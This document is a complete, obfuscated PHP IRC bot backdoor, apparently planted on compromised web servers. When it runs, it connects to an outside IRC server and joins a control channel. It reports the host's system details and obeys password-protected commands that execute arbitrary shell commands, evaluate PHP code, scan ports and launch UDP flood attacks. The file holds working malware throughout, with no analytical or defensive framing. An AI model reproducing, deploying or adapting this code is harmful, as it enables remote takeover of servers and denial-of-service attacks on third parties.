<?php set_time_limit(0); error_reporting(0);  class ZJRvRrnjjbZFZrfzF {

 var $BNbFVbVNrVNBNVZ = array("vjrjbfVnJrrFJzFN"=>"gangbang.angels-agency.nl",
                     "zRRF"=>"23232",
                     "jrzZJ"=>"scary",
                     "rJJbbF"=>"13",
                     "tlhPP"=>"#wWw#",
                     "RZv"=>"scan",
                     "nrNbZvVvr"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "bNBjRbRnRN"=>".",
                     "vFRZJzRBnrV"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $nvZJFbvzNFRnjZVBFj = array(); 
 function yMmayEIyUuAiqUuQ() {
  $xlhllx = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $XlPXPDh = strlen($xlhllx);
  for($l=0;$l<$this->BNbFVbVNrVNBNVZ['rJJbbF'];$l++) {
	$UQm .= $xlhllx[rand(0,$XlPXPDh-1)];
  }
  $this->eieYUQY("NICK ".$UQm."");
 } function UYYaqaAQQ($TldL) 
 { 
    $this->nvZJFbvzNFRnjZVBFj[$TldL] = true; 
 } function MQEAmmAquUiyY() 
 { 
    if(!($this->GCsOsoGCW = fsockopen($this->BNbFVbVNrVNBNVZ['vjrjbfVnJrrFJzFN'],$this->BNbFVbVNrVNBNVZ['zRRF'],$e,$s,30))) 
    $this->MQEAmmAquUiyY(); 
    $this->QuQAIiieQQiMiYAii();
    if(strlen($this->BNbFVbVNrVNBNVZ['jrzZJ'])>0) 
    $this->eieYUQY("PASS ".$this->BNbFVbVNrVNBNVZ['jrzZJ']);
    $this->yMmayEIyUuAiqUuQ();
    $this->yAimUiYeeEYUmm();
 } function uuaAMUMyEIymqQyAIUI() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $TpDdTtDLLtD = "\0034ON\003"; } else { $TpDdTtDLLtD = "\0039OFF\003"; }

	$DXxTxtll = php_uname();
	if($DXxTxtll == "") { $nvCcXx = "\00315---\003"; } else { $nvCcXx = "\00315".$DXxTxtll."\003"; }
		 
	 $FJSs = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $XTkgS =  getcwd()."";
	 
	 $tSkO = "\00315".$XTkgS."\003";

	$KKWsCgKgKO = fileperms("$XTkgS");

	if (($KKWsCgKgKO & 0xC000) == 0xC000) { $kkwokwOwcOk = 's';
	} elseif (($KKWsCgKgKO & 0xA000) == 0xA000) { $kkwokwOwcOk = 'l';
	} elseif (($KKWsCgKgKO & 0x8000) == 0x8000) { $kkwokwOwcOk = '-';
	} elseif (($KKWsCgKgKO & 0x6000) == 0x6000) { $kkwokwOwcOk = 'b';
	} elseif (($KKWsCgKgKO & 0x4000) == 0x4000) { $kkwokwOwcOk = 'd';
	} elseif (($KKWsCgKgKO & 0x2000) == 0x2000) { $kkwokwOwcOk = 'c';
	} elseif (($KKWsCgKgKO & 0x1000) == 0x1000) { $kkwokwOwcOk = 'p';
	} else { $kkwokwOwcOk = 'u'; }

	$kkwokwOwcOk .= (($KKWsCgKgKO & 0x0100) ? 'r' : '-');
	$kkwokwOwcOk .= (($KKWsCgKgKO & 0x0080) ? 'w' : '-');
	$kkwokwOwcOk .= (($KKWsCgKgKO & 0x0040) ?	(($KKWsCgKgKO & 0x0800) ? 's' : 'x' ) :	(($KKWsCgKgKO & 0x0800) ? 'S' : '-'));

	$kkwokwOwcOk .= (($KKWsCgKgKO & 0x0020) ? 'r' : '-');
	$kkwokwOwcOk .= (($KKWsCgKgKO & 0x0010) ? 'w' : '-');
	$kkwokwOwcOk .= (($KKWsCgKgKO & 0x0008) ?	(($KKWsCgKgKO & 0x0400) ? 's' : 'x' ) :	(($KKWsCgKgKO & 0x0400) ? 'S' : '-'));

	$kkwokwOwcOk .= (($KKWsCgKgKO & 0x0004) ? 'r' : '-');
	$kkwokwOwcOk .= (($KKWsCgKgKO & 0x0002) ? 'w' : '-');
	$kkwokwOwcOk .= (($KKWsCgKgKO & 0x0001) ?	(($KKWsCgKgKO & 0x0200) ? 't' : 'x' ) :	(($KKWsCgKgKO & 0x0200) ? 'T' : '-'));
			
	$nbdP = "\00315".$kkwokwOwcOk."\003";

	$this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"\00314[SAFE:\003\002 $TpDdTtDLLtD\002\00314]\00315 $FJSs \00314[pwd:]\00315 $tSkO \00314(\003$nbdP\00314) [uname:]\00315 $nvCcXx");
 } function iMueQmIqEyAa($TldL) 
 { 
    if(isset($this->nvZJFbvzNFRnjZVBFj[$TldL])) 
       return 1; 
    else 
       return 0; 
 } function IYMQaQYIya($DX,$XTT)
 {
    $this->eieYUQY("NOTICE $DX :$XTT");
 } function MuYiAqiu($TldL) 
 { 
    unset($this->nvZJFbvzNFRnjZVBFj[$TldL]); 
 } function IYeEaI($tlhPP,$RZv=NULL) 
 { 
    $this->eieYUQY("JOIN $tlhPP $RZv"); 
 } function QuQAIiieQQiMiYAii() {
  $xlhllx = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $XlPXPDh = strlen($xlhllx);
  for($l=0;$l<6;$l++) {
	$UQm .= $xlhllx[rand(0,$XlPXPDh-1)];
  }
  if(php_uname() == "") { $DXxTxtll = "---"; } else { $DXxTxtll = php_uname(); }
  $this->eieYUQY("USER ".$UQm."-go 127.0.0.1 localhost :".$DXxTxtll."");
 }function yAimUiYeeEYUmm() 
 { 
    while(!feof($this->GCsOsoGCW)) 
    { 
       $this->eyYme = trim(fgets($this->GCsOsoGCW,512)); 
       $JfNVJjRbFJFrJ = explode(" ",$this->eyYme); 
       if(substr($this->eyYme,0,6)=="PING :") 
       { 
          $this->eieYUQY("PONG :".substr($this->eyYme,6)); 
       } 
       if(isset($JfNVJjRbFJFrJ[1]) && $JfNVJjRbFJFrJ[1] =="004") 
       { 
          $this->eieYUQY("JOIN ".$this->BNbFVbVNrVNBNVZ['tlhPP']." ".$this->BNbFVbVNrVNBNVZ['RZv']."");
          $this->IYeEaI($this->BNbFVbVNrVNBNVZ['tlhPP'],$this->BNbFVbVNrVNBNVZ['RZv']);
          $this->uuaAMUMyEIymqQyAIUI();
       } 
       if(isset($JfNVJjRbFJFrJ[1]) && $JfNVJjRbFJFrJ[1]=="433") 
       { 
          $this->yMmayEIyUuAiqUuQ(); 
       }
       if($this->eyYme != $fvJ_hHT) 
       { 
          $RfjfvBVRFJnNfF = array(); 
          $goo = substr(strstr($this->eyYme," :"),2); 
          $coKS = explode(" ",$goo); 
          $soggw = explode("!",$JfNVJjRbFJFrJ[0]); 
          $kWSgGw = explode("@",$soggw[1]); 
          $kWSgGw = $kWSgGw[1]; 
          $soggw = substr($soggw[0],1); 
          $KwWWGkK = $JfNVJjRbFJFrJ[0]; 
          if($coKS[0]==$this->soggw) 
          { 
           for($l=0;$l<count($coKS);$l++) 
              $RfjfvBVRFJnNfF[$l] = $coKS[$l+1]; 
          } 
          else 
          { 
           for($l=0;$l<count($coKS);$l++) 
              $RfjfvBVRFJnNfF[$l] = $coKS[$l]; 
          } 
          if(count($JfNVJjRbFJFrJ)>2) 
          { 
             switch($JfNVJjRbFJFrJ[1]) 
             { 
                case "QUIT": 
                   if($this->iMueQmIqEyAa($KwWWGkK)) 
                   { 
                      $this->MuYiAqiu($KwWWGkK); 
                   } 
                break; 
                case "PART": 
                   if($this->iMueQmIqEyAa($KwWWGkK)) 
                   { 
                      $this->MuYiAqiu($KwWWGkK); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->iMueQmIqEyAa($KwWWGkK) && (md5($kWSgGw) == $this->BNbFVbVNrVNBNVZ['vFRZJzRBnrV'] || $this->BNbFVbVNrVNBNVZ['vFRZJzRBnrV'] == "*")) 
                   { 
                      if(substr($RfjfvBVRFJnNfF[0],0,1)==$this->BNbFVbVNrVNBNVZ['bNBjRbRnRN']) 
                      { 
                         switch(substr($RfjfvBVRFJnNfF[0],1)) 
                         { 
                            case "user": 
                              if(md5($RfjfvBVRFJnNfF[1])==$this->BNbFVbVNrVNBNVZ['nrNbZvVvr']) 
                              { 
                                 $this->UYYaqaAQQ($KwWWGkK);
                              } 
                              else 
                              { 
                                 $this->IYMQaQYIya($this->BNbFVbVNrVNBNVZ['tlhPP'],"[\002Auth\002]: Fout password $soggw idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->iMueQmIqEyAa($KwWWGkK)) 
                   { 
                      if(substr($RfjfvBVRFJnNfF[0],0,1)==$this->BNbFVbVNrVNBNVZ['bNBjRbRnRN']) 
                      { 
                         switch(substr($RfjfvBVRFJnNfF[0],1)) 
                         {                            case "die": 
                               $this->eieYUQY("QUIT :die command from $soggw");
                               fclose($this->GCsOsoGCW); 
                               exit;                            case "info":
                               $this->uuaAMUMyEIymqQyAIUI();
                            break;                            case "system": 
                               $cksWswscwSCc = substr(strstr($goo,$RfjfvBVRFJnNfF[0]),strlen($RfjfvBVRFJnNfF[0])+1); 
                               $ckSkogCGccKGw = system($cksWswscwSCc); 
                               $wwOGwkgKGGGGCK = explode("\n",$ckSkogCGccKGw); 
                               for($l=0;$l<count($wwOGwkgKGGGGCK);$l++) 
                                  if($wwOGwkgKGGGGCK[$l]!=NULL) 
                                     $this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"      : ".trim($wwOGwkgKGGGGCK[$l])); 
                            break;                            case "restart": 
                               $this->eieYUQY("QUIT :gerestart door $soggw");
                               fclose($this->GCsOsoGCW); 
                               $this->MQEAmmAquUiyY(); 
                            break;                            case "sexec":
                               $cksWswscwSCc = substr(strstr($goo,$RfjfvBVRFJnNfF[0]),strlen($RfjfvBVRFJnNfF[0])+1); 
                               $ckSkogCGccKGw = shell_exec($cksWswscwSCc); 
                               $wwOGwkgKGGGGCK = explode("\n",$ckSkogCGccKGw); 
                               for($l=0;$l<count($wwOGwkgKGGGGCK);$l++) 
                                  if($wwOGwkgKGGGGCK[$l]!=NULL) 
                                     $this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"      : ".trim($wwOGwkgKGGGGCK[$l])); 
                            break;                            case "logout": 
                               $this->MuYiAqiu($KwWWGkK); 
                               $this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"[\002Auth\002]\00314 Je bent nu uitgelogt $soggw"); 
                            break;                            case "raw":
                               $this->eieYUQY(strstr($goo,$RfjfvBVRFJnNfF[1])); 
                            break;                            case "rndnick": 
                               $this->yMmayEIyUuAiqUuQ(); 
                            break;                            case "dns": 
                               if(isset($RfjfvBVRFJnNfF[1])) 
                               { 
                                  $GS = explode(".",$RfjfvBVRFJnNfF[1]); 
                                  if(count($GS)==4 && is_numeric($GS[0]) && is_numeric($GS[1]) && is_numeric($GS[2]) && is_numeric($GS[3])) 
                                  { 
                                     $this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"[\002dns\002]: ".$RfjfvBVRFJnNfF[1]." => ".gethostbyaddr($RfjfvBVRFJnNfF[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"[\002dns\002]: ".$RfjfvBVRFJnNfF[1]." => ".gethostbyname($RfjfvBVRFJnNfF[1])); 
                                  } 
                               } 
                            break;                            case "passthru": 
                               $cksWswscwSCc = substr(strstr($goo,$RfjfvBVRFJnNfF[0]),strlen($RfjfvBVRFJnNfF[0])+1); 

                               $ckSkogCGccKGw = passthru($cksWswscwSCc); 
                               $wwOGwkgKGGGGCK = explode("\n",$ckSkogCGccKGw); 
                               for($l=0;$l<count($wwOGwkgKGGGGCK);$l++) 
                                  if($wwOGwkgKGGGGCK[$l]!=NULL) 
                                     $this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"      : ".trim($wwOGwkgKGGGGCK[$l])); 
                            break;                            case "exec": 
                               $cksWswscwSCc = substr(strstr($goo,$RfjfvBVRFJnNfF[0]),strlen($RfjfvBVRFJnNfF[0])+1); 
                               $ckSkogCGccKGw = exec($cksWswscwSCc); 
                               $wwOGwkgKGGGGCK = explode("\n",$ckSkogCGccKGw); 
                               for($l=0;$l<count($wwOGwkgKGGGGCK);$l++) 
                                  if($wwOGwkgKGGGGCK[$l]!=NULL) 
                                     $this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"      : ".trim($wwOGwkgKGGGGCK[$l])); 
                            break;                            case "pscan": 
                               if(count($RfjfvBVRFJnNfF) > 2) 
                               { 
                                  if(fsockopen($RfjfvBVRFJnNfF[1],$RfjfvBVRFJnNfF[2],$e,$s,15)) 
                                     $this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"[\002pscan\002]: ".$RfjfvBVRFJnNfF[1].":".$RfjfvBVRFJnNfF[2]." is \2open\2"); 
                                  else 
                                     $this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"[\002pscan\002]: ".$RfjfvBVRFJnNfF[1].":".$RfjfvBVRFJnNfF[2]." is \2closed\2"); 
                               } 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($goo,$RfjfvBVRFJnNfF[1]),strlen($RfjfvBVRFJnNfF[1])));
                            break;                            case "udpflood": 
                               if(count($RfjfvBVRFJnNfF)>3) 
                               { 
                                  $this->QMIUUImQIYeaUuqmMU($RfjfvBVRFJnNfF[1],$RfjfvBVRFJnNfF[2],$RfjfvBVRFJnNfF[3]); 
                               } 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $fvJ_hHT = $this->eyYme; 
    } 
    $this->MQEAmmAquUiyY(); 
 } function eieYUQY($XTT) 
 { 
    fwrite($this->GCsOsoGCW,"$XTT\r\n"); 
 } function QMIUUImQIYeaUuqmMU($TldL,$tpdDDpxXDP,$AQiy) {
	$this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"[\002UdpFlood Gestart!\002]"); 
	$xXHLdTxTp = "";
	for($l=0;$l<$tpdDDpxXDP;$l++) { $xXHLdTxTp .= chr(mt_rand(1,256)); }
	$LlttX = time();
	$l = 0;
	while(time()-$LlttX < $AQiy) {
		$BH=fsockopen("udp://".$TldL,mt_rand(0,6000),$e,$s,5);
      	fwrite($BH,$xXHLdTxTp);
       	fclose($BH);
		$l++;
	}
	$fWh = $l * $tpdDDpxXDP;
	$fWh = $fWh / 1048576;
	$lrg = $fWh / $AQiy;
	$lrg = round($lrg);
	$fWh = round($fWh);
	$this->eqUaEmAmmUy($this->BNbFVbVNrVNBNVZ['tlhPP'],"[\002UdpFlood Afgerond!\002]: $fWh MB verzonden / gemiddelde: $lrg MB/s ");
 } function eqUaEmAmmUy($DX,$XTT)
 {
    $this->eieYUQY("PRIVMSG $DX :$XTT");
 }}
$OKGOOoWc = new ZJRvRrnjjbZFZrfzF;
$OKGOOoWc->MQEAmmAquUiyY(); ?>